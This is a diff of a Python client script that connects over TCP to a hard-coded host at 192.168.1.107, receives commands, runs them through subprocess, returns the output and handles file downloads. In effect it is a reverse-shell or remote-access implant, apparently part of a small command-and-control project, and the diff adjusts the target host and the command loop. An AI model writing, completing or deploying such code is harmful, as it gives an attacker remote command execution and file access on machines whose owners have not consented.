@@ -1,25 +1,28 @@
 import os
 import socket
 import subprocess
+import time
 
 from utils import handle_cd, download_file
 
 
 def start_client():
-    host = '127.0.0.1'
+    host = '192.168.1.107'
     # host = '192.168.1.110'
     port = 12344
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
         client_socket.connect((host, port))
 
-        client_socket.sendall(os.getcwd().encode('utf-8'))
-
         while True:
+            time.sleep(0.001)
+            client_socket.sendall(os.getcwd().encode('utf-8'))
             # Receive command from the server
             command = client_socket.recv(4096).decode('utf-8')
 
-            if command.lower() == 'exit':
+            if command.lower().startswith('switch'):
+                continue
+            elif command.lower() == 'exit':
                 client_socket.close()
                 break
             elif command.lower().startswith('download'):
@@ -47,10 +50,12 @@ def start_client():
 
                 # Send the result back to the server
                 client_socket.sendall(result.stdout.encode('utf-8'))
+                continue
 
             except Exception as e:
                 # Send any errors back to the server
                 client_socket.sendall(str(e).encode('utf-8'))
+                continue
 
 
 if __name__ == "__main__":
